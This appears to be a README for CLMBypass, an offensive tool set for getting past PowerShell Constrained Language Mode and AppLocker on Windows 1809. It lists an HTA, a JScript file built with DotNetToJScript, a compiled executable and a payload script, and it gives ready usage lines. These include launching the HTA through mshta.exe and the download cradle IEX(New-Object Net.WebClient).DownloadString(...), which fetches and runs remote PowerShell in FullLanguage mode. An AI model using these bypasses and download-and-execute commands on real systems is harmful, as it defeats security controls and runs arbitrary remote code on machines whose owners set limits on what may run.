# CLMBypass

Bypass Constrained Language Mode in PowerShell, based off of [SecJuice's](https://www.secjuice.com/powershell-constrainted-language-mode-bypass-using-runspaces/) article.

#### key
- **[A]** denotes applocker bypass for 1809
- **[C]** denots Constrained Language Mode bypass for 1809

<hr>

### contents
- CLMBypass.hta [A][C]
  - The WScript.Shell creates a new runspace
  - `payload.ps1` is downloaded and executed in FullLanguage mode
  - **Usage:** mshta.exe http://localhost/CLMBypass.hta`
- CLMBypass.js [A][C]
  - Realized this is redundant... the hta execution already creates another runspace with FullLanguage mode. Leaving it here just in case.
  - **Usage:** On line `131` you can add something like `o.Main("IEX(New-Object Net.WebClient).DownloadString('http://localhost/somescript.ps1')");`
  - when the page is loaded, this will execute. If you use DotNetToJScript on your own, the functions and classes *must be public* and the class must have the `[ComVisible(true)]` tag (see Program.cs for an example).
- CLMBypass.exe [C]
  - Compiled as PE32 .NET Framework 4.0
  - **Usage:** `.\CLMBypass.exe "IEX(New-Object Net.WebClient).DownloadString('http://localhost/somescript.ps1')"`
- Program.cs
  - C# source code for CLMBypass.dll, a little outdated for the PE
- payload.ps1
  - payload to be run in FullLanguage mode